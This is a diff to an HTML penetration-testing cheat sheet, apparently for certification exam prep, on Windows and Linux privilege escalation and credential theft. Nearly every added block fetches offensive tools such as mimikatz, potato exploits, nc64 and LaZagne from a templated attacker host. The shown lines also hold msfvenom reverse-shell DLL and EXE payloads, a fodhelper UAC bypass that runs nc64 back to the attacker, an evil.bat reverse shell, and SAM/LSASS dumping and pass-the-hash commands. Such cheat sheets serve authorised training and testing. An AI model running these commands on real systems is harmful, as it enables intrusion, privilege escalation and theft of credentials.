@@ -445,6 +445,14 @@ Run <code>systeminfo | findstr /i "OS Name\|Build\|Architecture"</code> first. B
 <strong>Tip: Run winPEAS First</strong>
 Transfer winPEASx64.exe and run it immediately. Then read through this section to manually verify interesting findings.
 </div>
+<div class="cmd-wrap"><div class="cmd-label">TRANSFER — download enumeration tools to target (Kali HTTP server must be running)</div>
+<pre class="cmd">iwr -uri http://{{KALI_IP}}:{{PORT}}/windows/winPEASx64.exe -Outfile {{WPATH}}\winPEAS.exe
+iwr -uri http://{{KALI_IP}}:{{PORT}}/windows/SharpUp.exe -Outfile {{WPATH}}\SharpUp.exe
+iwr -uri http://{{KALI_IP}}:{{PORT}}/windows/Seatbelt.exe -Outfile {{WPATH}}\Seatbelt.exe
+iwr -uri http://{{KALI_IP}}:{{PORT}}/windows/nc64.exe -Outfile {{WPATH}}\nc64.exe</pre></div>
+<div class="alts">
+  <div class="alt-item"><span class="alt-arrow">&#8594;</span><code class="alt-cmd">certutil -urlcache -split -f http://{{KALI_IP}}:{{PORT}}/windows/winPEASx64.exe {{WPATH}}\winPEAS.exe</code> — CMD (no PS)</div>
+</div>
 
 <div class="subsection"><div class="subsection-title">User & System Context</div>
 <div class="cmd-wrap"><div class="cmd-label">Current user + all privileges and groups</div>
@@ -611,6 +619,12 @@ copy PowerUp.ps1 "C:\windows\temp\system32.ps1"
   <div class="alt-item"><span class="alt-arrow">&#8594;</span><code class="alt-cmd">type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config 2>nul | findstr connectionString</code></div>
 </div>
 
+<div class="cmd-wrap"><div class="cmd-label">TRANSFER — download to target (Kali HTTP server must be running)</div>
+<pre class="cmd">iwr -uri http://{{KALI_IP}}:{{PORT}}/windows/accesschk.exe -Outfile {{WPATH}}\accesschk.exe</pre></div>
+<div class="alts"><div class="alt-item"><span class="alt-arrow">&#8594;</span><code class="alt-cmd">certutil -urlcache -split -f http://{{KALI_IP}}:{{PORT}}/windows/accesschk.exe {{WPATH}}\accesschk.exe</code> — CMD (no PS)</div></div>
+<div class="cmd-wrap"><div class="cmd-label">TRANSFER — download to target (Kali HTTP server must be running)</div>
+<pre class="cmd">iwr -uri http://{{KALI_IP}}:{{PORT}}/windows/RunasCs.exe -Outfile {{WPATH}}\RunasCs.exe</pre></div>
+<div class="alts"><div class="alt-item"><span class="alt-arrow">&#8594;</span><code class="alt-cmd">certutil -urlcache -split -f http://{{KALI_IP}}:{{PORT}}/windows/RunasCs.exe {{WPATH}}\RunasCs.exe</code> — CMD (no PS)</div></div>
 <div class="cmd-wrap"><div class="cmd-label">Writable directories (for dropping tools)</div>
 <pre class="cmd">icacls C:\ /T /C 2>nul | findstr /i /c:"(F)" /c:"(M)" /c:"(W)" | findstr /i "Users Everyone"
 # (F)=FullControl, (M)=Modify (can replace binary!), (W)=Write. All three mean writable.</pre>
@@ -690,6 +704,15 @@ Tokens that show as "Disabled" in whoami /priv can still be enabled and abused. 
 Run EnableAllTokenPrivs.ps1 before deciding a token is unusable.
 </div>
 
+<div class="cmd-wrap"><div class="cmd-label">TRANSFER — download token abuse tools to target</div>
+<pre class="cmd">iwr -uri http://{{KALI_IP}}:{{PORT}}/windows/FullPowers.exe -Outfile {{WPATH}}\FullPowers.exe
+iwr -uri http://{{KALI_IP}}:{{PORT}}/windows/SeManageVolumeExploit.exe -Outfile {{WPATH}}\SeManageVolumeExploit.exe
+iwr -uri http://{{KALI_IP}}:{{PORT}}/windows/RunasCs.exe -Outfile {{WPATH}}\RunasCs.exe
+iwr -uri http://{{KALI_IP}}:{{PORT}}/windows/GodPotato-NET4.exe -Outfile {{WPATH}}\GodPotato-NET4.exe</pre></div>
+<div class="alts">
+  <div class="alt-item"><span class="alt-arrow">&#8594;</span><code class="alt-cmd">certutil -urlcache -split -f http://{{KALI_IP}}:{{PORT}}/windows/FullPowers.exe {{WPATH}}\FullPowers.exe</code> — CMD</div>
+</div>
+
 <div class="cmd-wrap"><div class="cmd-label">Check ALL privileges (enabled AND disabled)</div>
 <pre class="cmd">whoami /priv</pre></div>
 <div class="alts">
@@ -752,6 +775,9 @@ namespace Set_TokenPermission {
 $type = Add-Type $definition -PassThru
 $type[0]::EnablePrivilege() 2>&amp;&amp;1</pre></div>
 
+<div class="cmd-wrap"><div class="cmd-label">TRANSFER — download to target (Kali HTTP server must be running)</div>
+<pre class="cmd">iwr -uri http://{{KALI_IP}}:{{PORT}}/windows/FullPowers.exe -Outfile {{WPATH}}\FullPowers.exe</pre></div>
+<div class="alts"><div class="alt-item"><span class="alt-arrow">&#8594;</span><code class="alt-cmd">certutil -urlcache -split -f http://{{KALI_IP}}:{{PORT}}/windows/FullPowers.exe {{WPATH}}\FullPowers.exe</code> — CMD (no PS)</div></div>
 <div class="cmd-wrap"><div class="cmd-label">FullPowers.exe — recover service account default privileges</div>
 <pre class="cmd">{{WPATH}}\FullPowers.exe</pre></div>
 <div class="alts">
@@ -794,6 +820,13 @@ $type[0]::EnablePrivilege() 2>&amp;&amp;1</pre></div>
 <div class="callout callout-tip">
 <strong>Tip: Look for Out-of-Place Paths</strong>
 Services in C:\Windows\System32 are almost never exploitable. Look for services running from C:\Program Files\CustomApp\, C:\Users\, C:\Temp\, or any user-created directory. You need: (1) write access to the binary, AND (2) ability to restart the service (or wait for reboot).
+</div>
+<div class="cmd-wrap"><div class="cmd-label">TRANSFER — download tools to target first</div>
+<pre class="cmd">iwr -uri http://{{KALI_IP}}:{{PORT}}/windows/accesschk.exe -Outfile {{WPATH}}\accesschk.exe
+iwr -uri http://{{KALI_IP}}:{{PORT}}/scripts/PowerUp.ps1 -Outfile {{WPATH}}\PowerUp.ps1
+iwr -uri http://{{KALI_IP}}:{{PORT}}/windows/SharpUp.exe -Outfile {{WPATH}}\SharpUp.exe</pre></div>
+<div class="alts">
+  <div class="alt-item"><span class="alt-arrow">&#8594;</span><code class="alt-cmd">certutil -urlcache -split -f http://{{KALI_IP}}:{{PORT}}/windows/accesschk.exe {{WPATH}}\accesschk.exe</code> — CMD</div>
 </div>
 <div class="pipeline">
 <div class="pipe-step pipe-detect">
@@ -947,6 +980,11 @@ sc.exe start &lt;ServiceName&gt;</pre></div>
 <strong>Goal:</strong> Find a service that loads a DLL marked "NAME NOT FOUND" in ProcMon and place yours in a directory that's searched BEFORE the real DLL location — or in the app directory if you can write there.
 </div>
 <div class="callout callout-tip"><strong>💡 Manual method works on the exam.</strong> ProcMon helps on a test VM, but you can find hijackable DLLs manually: check if the service app directory is writable (most common), or if a writable PATH dir exists before System32. Common missing DLLs: version.dll, wlbsctrl.dll, wtsapi32.dll, wow64log.dll, msi.dll.</div>
+<div class="cmd-wrap"><div class="cmd-label">TRANSFER — compile malicious DLL on Kali (no target download needed for DLL itself)</div>
+<pre class="cmd"># On Kali — compile DLL payload:
+msfvenom -p windows/x64/shell_reverse_tcp LHOST={{KALI_IP}} LPORT={{RPORT}} -f dll -o ~/privesc-toolkit/&lt;MissingDLL&gt;.dll
+# Then serve and pull onto target:
+iwr -uri http://{{KALI_IP}}:{{PORT}}/&lt;MissingDLL&gt;.dll -Outfile {{WPATH}}\&lt;MissingDLL&gt;.dll</pre></div>
 
 <div class="pipeline">
 <div class="pipe-step pipe-detect">
@@ -1047,6 +1085,14 @@ sc.exe start &lt;ServiceName&gt;</pre></div>
   <div><div class="section-num">7.7</div><div class="section-title">Unquoted Service Paths</div>
   <div class="section-subtitle">Windows path resolution splits at spaces — place malicious exe at the split point</div></div>
   <div class="badges"><span class="badge badge-privesc">PRIVESC</span></div>
+</div>
+<div class="cmd-wrap"><div class="cmd-label">TRANSFER — download payload and accesschk to target</div>
+<pre class="cmd">iwr -uri http://{{KALI_IP}}:{{PORT}}/windows/accesschk.exe -Outfile {{WPATH}}\accesschk.exe
+# Your malicious exe — generate on Kali first, then serve:
+# msfvenom -p windows/x64/shell_reverse_tcp LHOST={{KALI_IP}} LPORT={{RPORT}} -f exe -o ~/privesc-toolkit/My.exe
+iwr -uri http://{{KALI_IP}}:{{PORT}}/My.exe -Outfile "C:\Program Files\My.exe"</pre></div>
+<div class="alts">
+  <div class="alt-item"><span class="alt-arrow">&#8594;</span><code class="alt-cmd">certutil -urlcache -split -f http://{{KALI_IP}}:{{PORT}}/windows/accesschk.exe {{WPATH}}\accesschk.exe</code> — CMD</div>
 </div>
 <div class="callout callout-info">
 <strong>How It Works</strong>
@@ -1450,7 +1496,8 @@ reg save hklm\system {{WPATH}}\system</pre></div>
 impacket-secretsdump -security security -system system LOCAL
 samdump2 system sam</pre></div>
 <div class="cmd-wrap"><div class="cmd-label">Optional: Mimikatz if files can't be transferred</div>
-<pre class="cmd">mimikatz.exe "privilege::debug" "lsadump::sam /sam:\"{{WPATH}}\sam\" /system:\"{{WPATH}}\system\"" exit</pre></div>
+<pre class="cmd">iwr -uri http://{{KALI_IP}}:{{PORT}}/windows/mimikatz.exe -Outfile {{WPATH}}\mimikatz.exe
+mimikatz.exe "privilege::debug" "lsadump::sam /sam:\"{{WPATH}}\sam\" /system:\"{{WPATH}}\system\"" exit</pre></div>
 </div>
 
 <div class="subsection"><div class="subsection-title">Windows.old / Volume Shadow Copies</div>
@@ -1557,12 +1604,14 @@ Get-UnquotedService</pre></div>
 <div class="tool-card">
 <div class="tool-name">SharpUp.exe</div><div class="tool-cat">Privesc • C# (CLM bypass)</div>
 <div class="tool-desc">C# privesc checker — works when PS is restricted. Same checks as PowerUp.</div>
-<div class="cmd-wrap"><pre class="cmd">{{WPATH}}\SharpUp.exe audit</pre></div>
+<div class="cmd-wrap"><pre class="cmd">iwr -uri http://{{KALI_IP}}:{{PORT}}/windows/SharpUp.exe -Outfile {{WPATH}}\SharpUp.exe
+{{WPATH}}\SharpUp.exe audit</pre></div>
 </div>
 <div class="tool-card">
 <div class="tool-name">Seatbelt.exe</div><div class="tool-cat">Survey • Host Recon</div>
 <div class="tool-desc">Comprehensive host survey — security checks, cred files, browser data.</div>
-<div class="cmd-wrap"><pre class="cmd">{{WPATH}}\Seatbelt.exe -group=system
+<div class="cmd-wrap"><pre class="cmd">iwr -uri http://{{KALI_IP}}:{{PORT}}/windows/Seatbelt.exe -Outfile {{WPATH}}\Seatbelt.exe
+{{WPATH}}\Seatbelt.exe -group=system
 {{WPATH}}\Seatbelt.exe -group=user
 {{WPATH}}\Seatbelt.exe -group=misc
 {{WPATH}}\Seatbelt.exe AMSIProviders</pre></div>
@@ -1570,7 +1619,8 @@ Get-UnquotedService</pre></div>
 <div class="tool-card">
 <div class="tool-name">PrivescCheck.ps1</div><div class="tool-cat">Privesc • PS</div>
 <div class="tool-desc">Comprehensive PS privesc check — more thorough than PowerUp. Must be dot-sourced then called.</div>
-<div class="cmd-wrap"><pre class="cmd"># Correct usage — dot-source THEN call the function:
+<div class="cmd-wrap"><pre class="cmd">iwr -uri http://{{KALI_IP}}:{{PORT}}/scripts/PrivescCheck.ps1 -Outfile {{WPATH}}\PrivescCheck.ps1
+# Correct usage — dot-source THEN call the function:
 . {{WPATH}}\PrivescCheck.ps1; Invoke-PrivescCheck -Extended
 . {{WPATH}}\PrivescCheck.ps1; Invoke-PrivescCheck -Extended | Out-File {{WPATH}}\privesccheck_output.txt</pre></div>
 <div class="callout callout-warn" style="margin-top:6px"><strong>❌ Wrong:</strong> Running <code>PrivescCheck.ps1 -Extended</code> directly does nothing — it's not a standalone script. Always dot-source first. In CLM → use winPEAS.bat or Seatbelt.exe instead.</div>
@@ -1628,6 +1678,16 @@ powershell.exe -ep bypass -exec bypass -File {{WPATH}}\jaws-enum.ps1 -OutputFile
   <div><div class="section-num">7.14</div><div class="section-title">Potato Family (SeImpersonate / SeAssignPrimaryToken)</div>
   <div class="section-subtitle">Requires SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege — check whoami /priv</div></div>
   <div class="badges"><span class="badge badge-privesc">PRIVESC</span><span class="badge badge-exploit">EXPLOIT</span></div>
+</div>
+<div class="cmd-wrap"><div class="cmd-label">TRANSFER — download potato tools to target (pick based on OS from compat table below)</div>
+<pre class="cmd">iwr -uri http://{{KALI_IP}}:{{PORT}}/windows/GodPotato-NET4.exe -Outfile {{WPATH}}\GodPotato-NET4.exe
+iwr -uri http://{{KALI_IP}}:{{PORT}}/windows/PrintSpoofer64.exe -Outfile {{WPATH}}\PrintSpoofer64.exe
+iwr -uri http://{{KALI_IP}}:{{PORT}}/windows/SweetPotato.exe -Outfile {{WPATH}}\SweetPotato.exe
+iwr -uri http://{{KALI_IP}}:{{PORT}}/windows/SigmaPotato.exe -Outfile {{WPATH}}\SigmaPotato.exe
+iwr -uri http://{{KALI_IP}}:{{PORT}}/windows/JuicyPotato.exe -Outfile {{WPATH}}\JuicyPotato.exe
+iwr -uri http://{{KALI_IP}}:{{PORT}}/windows/nc64.exe -Outfile {{WPATH}}\nc64.exe</pre></div>
+<div class="alts">
+  <div class="alt-item"><span class="alt-arrow">&#8594;</span><code class="alt-cmd">certutil -urlcache -split -f http://{{KALI_IP}}:{{PORT}}/windows/GodPotato-NET4.exe {{WPATH}}\GodPotato-NET4.exe</code> — CMD</div>
 </div>
 <div class="callout callout-danger">
 <strong>JuicyPotato WARNING</strong>
@@ -1844,6 +1904,11 @@ evil-winrm -i {{TARGET}} -u Administrator -H NTLM_HASH</pre></div>
 <pre class="cmd">tasklist /fi "IMAGENAME eq winlogon.exe"
 # Alternative target: lsass.exe (also runs as SYSTEM)
 tasklist /fi "IMAGENAME eq lsass.exe"</pre></div>
+<div class="cmd-wrap"><div class="cmd-label">TRANSFER — download exploit tool to target first</div>
+<pre class="cmd">iwr -uri http://{{KALI_IP}}:{{PORT}}/windows/SeDebugPrivesc.exe -Outfile {{WPATH}}\SeDebugPrivesc.exe</pre></div>
+<div class="alts">
+  <div class="alt-item"><span class="alt-arrow">&#8594;</span><code class="alt-cmd">certutil -urlcache -split -f http://{{KALI_IP}}:{{PORT}}/windows/SeDebugPrivesc.exe {{WPATH}}\SeDebugPrivesc.exe</code> — CMD</div>
+</div>
 <div class="cmd-wrap"><div class="cmd-label">Exploit — inject into SYSTEM process</div>
 <pre class="cmd">{{WPATH}}\SeDebugPrivesc.exe &lt;WINLOGON_PID&gt; cmd.exe</pre></div>
 <div class="cmd-wrap"><div class="cmd-label">Alternative — dump LSASS (requires SeDebug)</div>
@@ -1989,6 +2054,8 @@ whoami /groups | findstr /i "Administrators"
 </div>
 <div class="pipe-step pipe-exploit">
 <span class="pipe-step-label">3. EXPLOIT</span>
+<div class="cmd-wrap"><div class="cmd-label">TRANSFER — nc64.exe needed for reverse shell payload</div>
+<pre class="cmd">iwr -uri http://{{KALI_IP}}:{{PORT}}/windows/nc64.exe -Outfile {{WPATH}}\nc64.exe</pre></div>
 <div class="cmd-wrap"><pre class="cmd"># fodhelper.exe bypass (Win10 — very reliable)
 reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "{{WPATH}}\nc64.exe -e cmd.exe {{KALI_IP}} {{RPORT}}" /f
 reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /f
@@ -2046,6 +2113,12 @@ reg query HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard /v EnableVirtualizat
 </div>
 </div>
 
+<div class="cmd-wrap"><div class="cmd-label">TRANSFER — download dump tools to target</div>
+<pre class="cmd">iwr -uri http://{{KALI_IP}}:{{PORT}}/windows/procdump.exe -Outfile {{WPATH}}\procdump.exe
+iwr -uri http://{{KALI_IP}}:{{PORT}}/windows/mimikatz.exe -Outfile {{WPATH}}\mimikatz.exe</pre></div>
+<div class="alts">
+  <div class="alt-item"><span class="alt-arrow">&#8594;</span><code class="alt-cmd">certutil -urlcache -split -f http://{{KALI_IP}}:{{PORT}}/windows/procdump.exe {{WPATH}}\procdump.exe</code> — CMD</div>
+</div>
 <div class="cmd-wrap"><div class="cmd-label">Get LSASS PID</div>
 <pre class="cmd">tasklist /fi "imagename eq lsass.exe"
 Get-Process lsass</pre></div>
@@ -2067,6 +2140,13 @@ Get-Process lsass</pre></div>
   <div><div class="section-num">7.18</div><div class="section-title">Credential Manager</div>
   <div class="section-subtitle">Saved Windows credentials — often contains RDP/SMB creds for pivoting</div></div>
   <div class="badges"><span class="badge badge-creds">CREDS</span><span class="badge badge-new">NEW</span></div>
+</div>
+<div class="cmd-wrap"><div class="cmd-label">TRANSFER — download credential extraction tools</div>
+<pre class="cmd">iwr -uri http://{{KALI_IP}}:{{PORT}}/windows/mimikatz.exe -Outfile {{WPATH}}\mimikatz.exe
+iwr -uri http://{{KALI_IP}}:{{PORT}}/windows/RunasCs.exe -Outfile {{WPATH}}\RunasCs.exe
+iwr -uri http://{{KALI_IP}}:{{PORT}}/windows/nc64.exe -Outfile {{WPATH}}\nc64.exe</pre></div>
+<div class="alts">
+  <div class="alt-item"><span class="alt-arrow">&#8594;</span><code class="alt-cmd">certutil -urlcache -split -f http://{{KALI_IP}}:{{PORT}}/windows/mimikatz.exe {{WPATH}}\mimikatz.exe</code> — CMD</div>
 </div>
 <div class="cmd-wrap"><div class="cmd-label">List all saved credentials</div>
 <pre class="cmd">cmdkey /list</pre></div>
@@ -2527,6 +2607,11 @@ certipy auth -pfx administrator.pfx -ldap-shell -dc-ip {{TARGET}}
 </div>
 <div class="subsection"><div class="subsection-title">Upload and execute reverse shell</div>
 <div class="callout callout-warn"><strong>⚠️ Must use -X PUT for script upload</strong> — POST/default method will fail. Create the bat file locally first, then PUT it.</div>
+<div class="cmd-wrap"><div class="cmd-label">TRANSFER — download nc64.exe to target first</div>
+<pre class="cmd">iwr -uri http://{{KALI_IP}}:{{PORT}}/windows/nc64.exe -Outfile {{WPATH}}\nc64.exe</pre></div>
+<div class="alts">
+  <div class="alt-item"><span class="alt-arrow">&#8594;</span><code class="alt-cmd">certutil -urlcache -split -f http://{{KALI_IP}}:{{PORT}}/windows/nc64.exe {{WPATH}}\nc64.exe</code> — CMD fallback</div>
+</div>
 <div class="cmd-wrap"><div class="cmd-label">Step 1: Create the bat script locally on Windows target</div>
 <pre class="cmd">echo @echo off &gt; {{WPATH}}\evil.bat
 echo {{WPATH}}\nc64.exe {{KALI_IP}} {{RPORT}} -e cmd.exe &gt;&gt; {{WPATH}}\evil.bat</pre></div>
@@ -2721,6 +2806,11 @@ impacket-psexec WORKGROUP/Administrator@{{TARGET}} -hashes :NTLM_HASH</pre></div
 <pre class="cmd">crackmapexec smb {{TARGET}} -u {{USER}} -H NTLM_HASH --sam</pre></div>
 </div>
 <div class="subsection"><div class="subsection-title">PtH from Windows — mimikatz sekurlsa::pth</div>
+<div class="cmd-wrap"><div class="cmd-label">TRANSFER — download mimikatz to target first</div>
+<pre class="cmd">iwr -uri http://{{KALI_IP}}:{{PORT}}/windows/mimikatz.exe -Outfile {{WPATH}}\mimi.exe</pre></div>
+<div class="alts">
+  <div class="alt-item"><span class="alt-arrow">&#8594;</span><code class="alt-cmd">certutil -urlcache -split -f http://{{KALI_IP}}:{{PORT}}/windows/mimikatz.exe {{WPATH}}\mimi.exe</code> — CMD fallback</div>
+</div>
 <div class="cmd-wrap"><div class="cmd-label">Spawn a new cmd.exe process with the hash injected</div>
 <pre class="cmd">{{WPATH}}\mimi.exe "privilege::debug" "sekurlsa::pth /user:Administrator /domain:{{DOMAIN}} /ntlm:NTLM_HASH /run:cmd.exe" exit</pre></div>
 <div class="cmd-wrap"><div class="cmd-label">Spawn PowerShell with hash</div>
@@ -2968,6 +3058,7 @@ Get-ChildItem -Path C:\Users -Recurse -Include *.bak,*.backup,*.old,*.orig -Erro
 <div class="tool-card">
 <div class="tool-name">Snaffler</div><div class="tool-cat">File Share &amp; Disk Sniffer</div>
 <div class="tool-desc">Finds interesting files on SMB shares and local disk — passwords, config files, keys, scripts. Domain-aware but also works standalone.</div>
+<div class="cmd-wrap"><pre class="cmd">iwr -uri http://{{KALI_IP}}:{{PORT}}/windows/Snaffler.exe -Outfile {{WPATH}}\Snaffler.exe</pre></div>
 <div class="cmd-wrap"><pre class="cmd"># Local disk scan:
 {{WPATH}}\Snaffler.exe -s -o {{WPATH}}\snaffler.log -v data
 # Domain share scan (if domain-joined):
@@ -2980,6 +3071,7 @@ type {{WPATH}}\snaffler.log | findstr "\[Red\]\|\[Black\]"</pre></div>
 <div class="tool-card">
 <div class="tool-name">LaZagne</div><div class="tool-cat">Credential Extractor • Multi-source</div>
 <div class="tool-desc">Extracts passwords from browsers, git, databases, WiFi, mail clients, vaults, Windows Credential Manager, and more.</div>
+<div class="cmd-wrap"><pre class="cmd">iwr -uri http://{{KALI_IP}}:{{PORT}}/windows/laZagne.exe -Outfile {{WPATH}}\laZagne.exe</pre></div>
 <div class="cmd-wrap"><pre class="cmd">{{WPATH}}\laZagne.exe all
 {{WPATH}}\laZagne.exe all -oJ {{WPATH}}\lazagne_out.json   # JSON output
 {{WPATH}}\laZagne.exe windows            # Windows-specific (Credential Manager, LSA)
@@ -3001,6 +3093,7 @@ type {{WPATH}}\snaffler.log | findstr "\[Red\]\|\[Black\]"</pre></div>
 <div class="tool-card">
 <div class="tool-name">SharpDPAPI</div><div class="tool-cat">DPAPI Decryption • Vault Creds</div>
 <div class="tool-desc">Decrypts DPAPI-protected credentials — Windows Credential Manager, browser passwords, DPAPI blobs.</div>
+<div class="cmd-wrap"><pre class="cmd">iwr -uri http://{{KALI_IP}}:{{PORT}}/windows/SharpDPAPI.exe -Outfile {{WPATH}}\SharpDPAPI.exe</pre></div>
 <div class="cmd-wrap"><pre class="cmd">{{WPATH}}\SharpDPAPI.exe credentials    # Windows Credential Manager
 {{WPATH}}\SharpDPAPI.exe vaults         # Windows Vaults
 {{WPATH}}\SharpDPAPI.exe triage         # Comprehensive triage
@@ -3284,8 +3377,10 @@ done | sort -u
 <div class="pipeline">
 <div class="pipe-step pipe-detect">
 <span class="pipe-step-label">1. DETECT — find cron jobs and what they execute</span>
+<div class="cmd-wrap"><div class="cmd-label">TRANSFER — download to target first (Kali HTTP server must be running)</div>
+<pre class="cmd">wget http://{{KALI_IP}}:{{PORT}}/linux/pspy64 -O /tmp/pspy64 && chmod +x /tmp/pspy64</pre></div>
 <div class="cmd-wrap"><div class="cmd-label">Watch live with pspy64 — shows exact commands cron runs (recommended, run 2+ MINUTES)</div>
-<pre class="cmd">./pspy64 -pf -i 1000
+<pre class="cmd">/tmp/pspy64 -pf -i 1000
 # Wait 2+ minutes minimum — crons run at intervals, not on demand. Watch for UID=0 lines.</pre></div>
 <div class="cmd-wrap"><div class="cmd-label">Full sweep of all cron tables</div>
 <pre class="cmd">crontab -l 2>/dev/null
@@ -3709,11 +3804,15 @@ uname -r | awk -F'[.-]' '{maj=$1+0; min=$2+0; patch=$3+0;
 
 # 3. Baron Samedit (CVE-2021-3156) — sudo < 1.9.5p2
 sudo --version 2>/dev/null | head -1</pre></div>
+<div class="cmd-wrap"><div class="cmd-label">TRANSFER — download to target first (Kali HTTP server must be running)</div>
+<pre class="cmd">wget http://{{KALI_IP}}:{{PORT}}/linux/linux-exploit-suggester.sh -O /tmp/linux-exploit-suggester.sh && chmod +x /tmp/linux-exploit-suggester.sh
+wget http://{{KALI_IP}}:{{PORT}}/linux/linux-exploit-suggester-2.pl -O /tmp/linux-exploit-suggester-2.pl
+wget http://{{KALI_IP}}:{{PORT}}/linux/exploit-suggester.py -O /tmp/exploit-suggester.py</pre></div>
 <div class="cmd-wrap"><div class="cmd-label">Run exploit suggester (copy to target)</div>
-<pre class="cmd">./linux-exploit-suggester.sh</pre></div>
+<pre class="cmd">/tmp/linux-exploit-suggester.sh</pre></div>
 <div class="alts">
-  <div class="alt-item"><span class="alt-arrow">&#8594;</span><code class="alt-cmd">perl linux-exploit-suggester-2.pl</code></div>
-  <div class="alt-item"><span class="alt-arrow">&#8594;</span><code class="alt-cmd">python3 exploit-suggester.py</code> — Python version, different detection engine</div>
+  <div class="alt-item"><span class="alt-arrow">&#8594;</span><code class="alt-cmd">perl /tmp/linux-exploit-suggester-2.pl</code></div>
+  <div class="alt-item"><span class="alt-arrow">&#8594;</span><code class="alt-cmd">python3 /tmp/exploit-suggester.py</code> — Python version, different detection engine</div>
 </div>
 
 <div class="tbl-wrap"><table>
@@ -4163,29 +4262,39 @@ chmod +x linpeas.sh && ./linpeas.sh
 <div class="tool-card">
 <div class="tool-name">LinEnum</div><div class="tool-cat">Enum • Classic</div>
 <div class="tool-desc">Comprehensive enumeration, password keyword search.</div>
-<div class="cmd-wrap"><pre class="cmd">./LinEnum.sh
-./LinEnum.sh -t -k password
-./LinEnum.sh | tee linenum_output.txt</pre></div>
+<div class="cmd-wrap"><div class="cmd-label">TRANSFER — download to target first (Kali HTTP server must be running)</div>
+<pre class="cmd">wget http://{{KALI_IP}}:{{PORT}}/linux/LinEnum.sh -O /tmp/LinEnum.sh && chmod +x /tmp/LinEnum.sh</pre></div>
+<div class="cmd-wrap"><pre class="cmd">/tmp/LinEnum.sh
+/tmp/LinEnum.sh -t -k password
+/tmp/LinEnum.sh | tee linenum_output.txt</pre></div>
 </div>
 <div class="tool-card">
 <div class="tool-name">pspy64</div><div class="tool-cat">Process Monitor • No Root</div>
 <div class="tool-desc">Monitor processes without root — catches hidden cron jobs. Run for 2+ minutes.</div>
-<div class="cmd-wrap"><pre class="cmd">./pspy64
-./pspy32       # 32-bit
-./pspy64 -pf -i 1000</pre></div>
+<div class="cmd-wrap"><div class="cmd-label">TRANSFER — download to target first (Kali HTTP server must be running)</div>
+<pre class="cmd">wget http://{{KALI_IP}}:{{PORT}}/linux/pspy64 -O /tmp/pspy64 && chmod +x /tmp/pspy64
+wget http://{{KALI_IP}}:{{PORT}}/linux/pspy32 -O /tmp/pspy32 && chmod +x /tmp/pspy32</pre></div>
+<div class="cmd-wrap"><pre class="cmd">/tmp/pspy64
+/tmp/pspy32       # 32-bit
+/tmp/pspy64 -pf -i 1000</pre></div>
 </div>
 <div class="tool-card">
 <div class="tool-name">lse.sh</div><div class="tool-cat">Smart Enum • Levels</div>
 <div class="tool-desc">Linux Smart Enumeration — levels 0-2 for increasing detail.</div>
-<div class="cmd-wrap"><pre class="cmd">./lse.sh -l1
-./lse.sh -l2
-./lse.sh -l1 -i   # interactive</pre></div>
+<div class="cmd-wrap"><div class="cmd-label">TRANSFER — download to target first (Kali HTTP server must be running)</div>
+<pre class="cmd">wget http://{{KALI_IP}}:{{PORT}}/linux/lse.sh -O /tmp/lse.sh && chmod +x /tmp/lse.sh</pre></div>
+<div class="cmd-wrap"><pre class="cmd">/tmp/lse.sh -l1
+/tmp/lse.sh -l2
+/tmp/lse.sh -l1 -i   # interactive</pre></div>
 </div>
 <div class="tool-card">
 <div class="tool-name">linux-exploit-suggester</div><div class="tool-cat">Kernel Exploits</div>
 <div class="tool-desc">Suggests kernel exploits based on running kernel version.</div>
-<div class="cmd-wrap"><pre class="cmd">./linux-exploit-suggester.sh
-perl linux-exploit-suggester-2.pl</pre></div>
+<div class="cmd-wrap"><div class="cmd-label">TRANSFER — download to target first (Kali HTTP server must be running)</div>
+<pre class="cmd">wget http://{{KALI_IP}}:{{PORT}}/linux/linux-exploit-suggester.sh -O /tmp/linux-exploit-suggester.sh && chmod +x /tmp/linux-exploit-suggester.sh
+wget http://{{KALI_IP}}:{{PORT}}/linux/linux-exploit-suggester-2.pl -O /tmp/linux-exploit-suggester-2.pl</pre></div>
+<div class="cmd-wrap"><pre class="cmd">/tmp/linux-exploit-suggester.sh
+perl /tmp/linux-exploit-suggester-2.pl</pre></div>
 </div>
 <div class="tool-card">
 <div class="tool-name">unix-privesc-check</div><div class="tool-cat">Checker</div>
@@ -5338,21 +5447,25 @@ find / -name ".git" -type d 2>/dev/null | xargs -I{} cat {}/config 2>/dev/null |
 <div class="tool-card">
 <div class="tool-name">LaZagne (Linux)</div><div class="tool-cat">Multi-source Credential Extractor</div>
 <div class="tool-desc">Same LaZagne as Windows — Python version. Extracts credentials from browsers, git, SSH, databases, mail, chats, AWS and more. Works without root for user-readable sources.</div>
-<div class="cmd-wrap"><pre class="cmd">python3 laZagne.py all
-python3 laZagne.py all -oJ /tmp/lazagne_out.json    # JSON output
-python3 laZagne.py browsers       # Chrome, Firefox, Chromium
-python3 laZagne.py ssh            # SSH keys and known_hosts
-python3 laZagne.py databases      # MySQL, PostgreSQL, SQLite
-python3 laZagne.py git            # git credential store
-python3 laZagne.py mail           # Thunderbird, Evolution
-python3 laZagne.py chats          # Pidgin, Skype</pre></div>
+<div class="cmd-wrap"><div class="cmd-label">TRANSFER — download to target first (Kali HTTP server must be running)</div>
+<pre class="cmd">wget http://{{KALI_IP}}:{{PORT}}/linux/laZagne.py -O /tmp/laZagne.py</pre></div>
+<div class="cmd-wrap"><pre class="cmd">python3 /tmp/laZagne.py all
+python3 /tmp/laZagne.py all -oJ /tmp/lazagne_out.json    # JSON output
+python3 /tmp/laZagne.py browsers       # Chrome, Firefox, Chromium
+python3 /tmp/laZagne.py ssh            # SSH keys and known_hosts
+python3 /tmp/laZagne.py databases      # MySQL, PostgreSQL, SQLite
+python3 /tmp/laZagne.py git            # git credential store
+python3 /tmp/laZagne.py mail           # Thunderbird, Evolution
+python3 /tmp/laZagne.py chats          # Pidgin, Skype</pre></div>
 </div>
 <div class="tool-card">
 <div class="tool-name">Mimipenguin</div><div class="tool-cat">Memory Credential Dump (needs root)</div>
 <div class="tool-desc">Extracts plaintext credentials from Linux process memory — gnome-keyring, vsftpd, sshd, Apache, git. Usually needs root but worth trying.</div>
-<div class="cmd-wrap"><pre class="cmd">python3 mimipenguin.py    # Python version (most compatible)
-bash mimipenguin.sh        # Bash version
-./mimipenguin              # compiled binary
+<div class="cmd-wrap"><div class="cmd-label">TRANSFER — download to target first (Kali HTTP server must be running)</div>
